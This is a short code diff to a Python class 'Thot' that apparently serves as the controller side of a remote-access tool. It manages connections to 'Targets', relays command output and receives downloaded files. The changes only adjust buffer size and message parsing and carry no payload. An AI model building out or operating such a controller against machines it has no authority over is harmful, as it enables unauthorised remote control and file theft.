@@ -253,7 +253,6 @@ class Thot:
         print('\n')
         print(tabulate(self.__result_list_connections, headers='firstrow', tablefmt='simple', stralign='center'))
 
-
     def kill_all_connections(self, signal=None, frame=None):
         global _pool_connections
 
@@ -325,7 +324,7 @@ class Thot:
     def transfer(self, __id_connection, __connection):
         global _exit_flag
         self.__socket_fd = __connection
-        self.__buffer_size = 0x400
+        self.__buffer_size = 0x2000  # 0x400
         self.__id_connection_transfer = __id_connection
 
         while True:
@@ -350,12 +349,17 @@ class Thot:
                 _exit_flag = False
 
             try:
+
                 try:
-                    self.__data_response = self.__buffer.decode('utf-8')
-                    self.__data_response = json.loads(self.__data_response)
+                    self.__data_response = json.loads(self.__buffer.decode('utf-8'))
                     anubis.processor(self.__socket_fd, self.__data_response)
                 except json.decoder.JSONDecodeError as Error:
-                    sys.stdout.write(color.color("lgray", self.__data_response))
+                    if self.__buffer.decode('utf-8') == 'recv_download_file':
+                        anubis.processor(self.__socket_fd, {'recv_download_file': self.__buffer})
+                    else:
+                        sys.stdout.write(color.color("lgray", self.__buffer.decode('utf-8')))
+                except UnicodeDecodeError:
+                    pass
             except KeyboardInterrupt:
                 print_message.execution_error("Target {} Lost".format(self.__id_connection_transfer))
 
@@ -471,5 +475,3 @@ class Thot:
                     print_message.execution_info("Please Enter command")
             else:
                 print_message.execution_error("Command not found")
-
-
